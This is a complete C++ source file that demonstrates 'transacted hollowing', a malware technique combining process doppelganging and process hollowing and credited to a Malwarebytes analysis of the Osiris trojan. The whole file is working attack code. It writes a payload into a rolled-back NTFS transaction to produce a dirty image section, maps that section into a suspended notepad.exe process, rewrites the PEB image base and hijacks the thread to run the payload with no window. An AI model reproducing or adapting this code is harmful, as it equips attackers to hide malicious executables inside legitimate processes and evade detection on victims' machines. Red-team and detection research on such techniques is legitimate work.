/**
* Demonstrates transacted hollowing. A combination of process hollowing and process doppelganging.
* Supports 32- and 64 Bit applications.
* Based on: https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/
*/

#include <Windows.h>
#include <cstdio>
#include <cstdint>
#include <KtmW32.h>

#include "../common/ntddk.h"


int8_t* CreatePayloadBuffer(char* filename, DWORD* filesize)
{
	// open payload file
	HANDLE payloadFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (payloadFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to open payload %s\n", GetLastError(), filename);
		return nullptr;
	}

	// create a mapping of the payload
	HANDLE payloadMapping = CreateFileMapping(payloadFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!payloadMapping)
	{
		printf("[Error] %d - Failed to CreateFileMapping\n", GetLastError());
		CloseHandle(payloadFile);
		return nullptr;
	}

	// map a view of the payload file into the process
	int8_t* payloadDataView = (int8_t*)MapViewOfFile(payloadMapping, FILE_MAP_READ, 0, 0, 0);
	if (!payloadDataView)
	{
		printf("[Error] %d - Failed to MapViewOfFile\n", GetLastError());
		CloseHandle(payloadMapping);
		CloseHandle(payloadFile);
		return nullptr;
	}

	// allocate space for a copy of the payload
	*filesize = GetFileSize(payloadFile, 0);
	int8_t* payloadFileCopy = (int8_t*)VirtualAlloc(NULL, *filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!payloadFileCopy)
	{
		printf("[Error] %d - Failed to VirtualAlloc\n", GetLastError());
		return nullptr;
	}

	// copy payload into allocated memory
	memcpy(payloadFileCopy, payloadDataView, *filesize);

	// cleanup
	UnmapViewOfFile(payloadDataView);
	CloseHandle(payloadMapping);
	CloseHandle(payloadFile);
	return payloadFileCopy;
}

HANDLE CreateDirtySectionOfCleanFile(int8_t* payloadBuffer, DWORD payloadSize)
{
	// create transaction to be rolled back later
	HANDLE transaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
	if (transaction == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateTransaction\n", GetLastError());
		return nullptr;
	}

	// open a clean file transacted
	HANDLE transactedFile = CreateFileTransacted("svchost.exe",
		GENERIC_WRITE | GENERIC_READ,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr,
		transaction,
		nullptr,
		nullptr
	);
	if (transactedFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateFileTransacted\n", GetLastError());
		return nullptr;
	}

	// overwrite file with malicious payload
	DWORD numberOfBytesWritten;
	if (!WriteFile(transactedFile, payloadBuffer, payloadSize, &numberOfBytesWritten, nullptr))
	{
		printf("[Error] %d - Failed to WriteFile\n", GetLastError());
		return nullptr;
	}

	// create a dirty section
	HANDLE section = nullptr;
	if (!NT_SUCCESS(NtCreateSection(&section, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, transactedFile)))
	{
		printf("[Error] - Failed to NtCreateSection for malicious executable\n");
		return nullptr;
	}
	CloseHandle(transactedFile);

	// rollback transaction so file system is clean again while we still have a dirty section
	if (!RollbackTransaction(transaction))
	{
		printf("[Error] %d - Failed to RollbackTransaction\n", GetLastError());
		return nullptr;
	}
	CloseHandle(transaction);
	return section;
}

int main(int argc, char* argv[])
{
	char* applicationPath = "C:\\Windows\\System32\\notepad.exe";
	char* payloadPath = "";

	if (argc == 2)
	{
		printf("[Info] - Using default target: %s\n", applicationPath);
		payloadPath = argv[1];
	}
	if (argc == 3)
	{
		applicationPath = argv[1];
		payloadPath = argv[2];
	}
	
	if (argc != 2 && argc != 3)
	{
		printf("Usage: *.exe [applicationPath] payloadPath\n");
		return 1;
	}

	STARTUPINFOA startupInfo = STARTUPINFOA();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION();

	// create the process in a suspended state
	if (!CreateProcessA(0,
		applicationPath,
		0,
		0,
		0,
		CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
		0,
		0,
		&startupInfo,
		&processInformation))
	{
		printf("[Error] %d - Failed to create process using application %s\n", GetLastError(), applicationPath);
		return 1;
	}

	printf("[Info] - Created suspended process %s with id %d\n", applicationPath, processInformation.dwProcessId);

	// create payload
	DWORD payloadSize = 0;
	int8_t* payloadBuffer = CreatePayloadBuffer(payloadPath, &payloadSize);
	if (!payloadBuffer)
	{
		printf("[Error] - Failed to read payload\n");
		return 1;
	}

	printf("[Info] - Created payload buffer at %p\n", payloadBuffer);

	// create a dirty section of a file that is clean on disc
	HANDLE dirtySectionHandle = CreateDirtySectionOfCleanFile(payloadBuffer, payloadSize);
	if (!dirtySectionHandle)
	{
		printf("[Error] - Failed to create dirty section\n");
		return 1;
	}

	printf("[Info] - Created dirty section with handle %p\n", dirtySectionHandle);

	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T viewSize = 0;
	PVOID mappedDirtySection = 0;

	if (!NT_SUCCESS(NtMapViewOfSection(dirtySectionHandle, processInformation.hProcess,
		&mappedDirtySection, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)))
	{
		printf("[Error] - NtMapViewOfSection - Failed to map dirty section into suspended process\n");
		return 1;
	}

	printf("[Info] - Mapped dirty section into suspended process at %p\n", mappedDirtySection);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
	DWORD entryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;

	// get address of remote image base
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	ULONG returnLength = 0;
	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("Error %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}

	int8_t* imageBaseAddress = (int8_t*)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);

	// overwrite remote image base with address of the mapped dirty section
	if (!WriteProcessMemory(processInformation.hProcess, imageBaseAddress, &mappedDirtySection, sizeof(void*), NULL))
	{
		printf("Error %d - Failed to write new image base\n", GetLastError());
		return 1;
	}

	printf("[Info] - Updated remote image base address at %p to dirty payload section %p\n", imageBaseAddress, mappedDirtySection);

	// hijack the thread and make set it up to execute the new entry point
	CONTEXT context = CONTEXT();
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed GetThreadContext\n", GetLastError());
		return 1;
	}
#ifdef _WIN64
	context.Rcx = (DWORD_PTR)mappedDirtySection + entryPoint;
#else
	context.Eax = (DWORD_PTR)mappedDirtySection + entryPoint;
#endif
	if (!SetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed SetThreadContext\n", GetLastError());
		return 1;
	}

	printf("[Info] - Hijacked thread to execute payload entry point %p\n", (int8_t*)mappedDirtySection + entryPoint);

	// continue execution of the suspended process
	if (!ResumeThread(processInformation.hThread))
	{
		printf("[Error] %d -  Failed ResumeThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resumed execution of hijacked thread\n");

	return 0;
}